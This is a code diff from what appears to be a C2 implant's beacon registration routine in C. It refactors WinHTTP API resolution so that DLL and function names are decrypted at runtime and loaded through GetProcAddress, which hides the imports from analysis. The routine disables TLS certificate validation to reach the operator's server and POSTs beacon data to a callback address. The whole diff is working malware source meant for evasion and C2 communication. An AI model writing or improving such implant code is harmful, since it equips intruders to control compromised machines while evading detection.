@@ -144,16 +144,62 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     CHAR                ReadBuffer[dwSize + 1];
     DWORD               dwDownloaded = 0;
     HINTERNET           hSession = NULL, hConnect = NULL, hRequest = NULL;
+    HMODULE             hWinHTTPdll;
+    char*               tmp_decrypted_str;
     struct json_object *parsed_json;
 
-    // get the close handle export
-    WinHttpCloseHandle_ rWinHttpCloseHandle = (WinHttpCloseHandle_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
-                                                                                              decrypt_string(STRING_WINHTTP_CLOSEH, STRING_WINHTTP_CLOSEH_KEY));
+    // create all references to dll functions
+    // Load WinHTTP.dll
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY);
+    hWinHTTPdll = LoadLibrary(tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpCloseHandle reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_CLOSEH, STRING_WINHTTP_CLOSEH_KEY);
+    WinHttpCloseHandle_ rWinHttpCloseHandle = (WinHttpCloseHandle_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpOpen reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_OPEN, STRING_WINHTTP_OPEN_KEY);
+    WinHttpOpen_ rWinHttpOpen = (WinHttpOpen_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpConnect reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_CONNECT, STRING_WINHTTP_CONNECT_KEY);
+    WinHttpConnect_ rWinHttpConnect = (WinHttpConnect_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpOpenRequest reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_OPENREQ, STRING_WINHTTP_OPENREQ_KEY);
+    WinHttpOpenRequest_ rWinHttpOpenRequest = (WinHttpOpenRequest_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpSetOption reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_SETOPT, STRING_WINHTTP_SETOPT_KEY);
+    WinHttpSetOption_ rWinHttpSetOption = (WinHttpSetOption_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpSendRequest reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_SENDREQ, STRING_WINHTTP_SENDREQ_KEY);
+    WinHttpSendRequest_ rWinHttpSendRequest = (WinHttpSendRequest_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpReceiveResponse reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_RECVRES, STRING_WINHTTP_RECVRES_KEY);
+    WinHttpReceiveResponse_ rWinHttpReceiveResponse = (WinHttpReceiveResponse_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpQueryDataAvailable reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_DATAAVA, STRING_WINHTTP_DATAAVA_KEY);
+    WinHttpQueryDataAvailable_ rWinHttpQueryDataAvailable = (WinHttpQueryDataAvailable_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
+
+    // Create WinHttpReadData reference
+    tmp_decrypted_str = decrypt_string(STRING_WINHTTP_READATA, STRING_WINHTTP_READATA_KEY);
+    WinHttpReadData_ rWinHttpReadData = (WinHttpReadData_)GetProcAddress(hWinHTTPdll, tmp_decrypted_str);
+    free(tmp_decrypted_str);
 
     // init the connection
-    WinHttpOpen_ rWinHttpOpen = (WinHttpOpen_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
-                                                                         decrypt_string(STRING_WINHTTP_OPEN, STRING_WINHTTP_OPEN_KEY));
-
     hSession = rWinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 
     if (!hSession)
@@ -164,9 +210,6 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     }
 
     // do the connection
-    WinHttpConnect_ rWinHttpConnect = (WinHttpConnect_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
-                                                                                  decrypt_string(STRING_WINHTTP_CONNECT, STRING_WINHTTP_CONNECT_KEY));
-
     hConnect = rWinHttpConnect(hSession, (LPCWSTR)CallbackAddress, CallbackPort, 0);
 
     if (!hConnect)
@@ -179,8 +222,6 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     }
 
     // set up the request
-    WinHttpOpenRequest_ rWinHttpOpenRequest = (WinHttpOpenRequest_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
-                                                                                              decrypt_string(STRING_WINHTTP_OPENREQ, STRING_WINHTTP_OPENREQ_KEY));
 
     hRequest = rWinHttpOpenRequest(hConnect, L"POST", _REGISTER_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
 
@@ -197,9 +238,6 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked
     flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-    WinHttpSetOption_ rWinHttpSetOption = (WinHttpSetOption_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
-                                                                                        decrypt_string(STRING_WINHTTP_SETOPT, STRING_WINHTTP_SETOPT_KEY));
-
     if (!rWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
     {
         rWinHttpCloseHandle(hRequest);
@@ -212,16 +250,12 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     }
 
     // finally send the actual request to the c2
-    WinHttpSendRequest_ rWinHttpSendRequest = (WinHttpSendRequest_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
-                                                                                              decrypt_string(STRING_WINHTTP_SENDREQ, STRING_WINHTTP_SENDREQ_KEY));
 
     bResults = rWinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);
 
     // make sure the request was successful
     if (bResults)
     {
-        WinHttpReceiveResponse_ rWinHttpReceiveResponse = (WinHttpReceiveResponse_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
-                                                                                                              decrypt_string(STRING_WINHTTP_RECVRES, STRING_WINHTTP_RECVRES_KEY));
         bResults = rWinHttpReceiveResponse(hRequest, NULL);
     } else {
         if (GetLastError() & ERROR_WINHTTP_SECURE_FAILURE)
@@ -237,17 +271,12 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     {
         do
         {
-            WinHttpQueryDataAvailable_ rWinHttpQueryDataAvailable = (WinHttpQueryDataAvailable_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
-                                                                                                                           decrypt_string(STRING_WINHTTP_DATAAVA, STRING_WINHTTP_DATAAVA_KEY));
             if (!rWinHttpQueryDataAvailable( hRequest, &dwSize))
             {
                 // Theres no data avalible
                 DEBUG("FAILED: WinHttpQueryDataAvailable, GetLastError(): %d", GetLastError());
                 return FALSE;
             }
-
-            WinHttpReadData_ rWinHttpReadData = (WinHttpReadData_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
-                                                                                             decrypt_string(STRING_WINHTTP_READATA, STRING_WINHTTP_READATA_KEY));
 
             if (!rWinHttpReadData( hRequest, (LPVOID)ReadBuffer, dwSize, &dwDownloaded))
             {
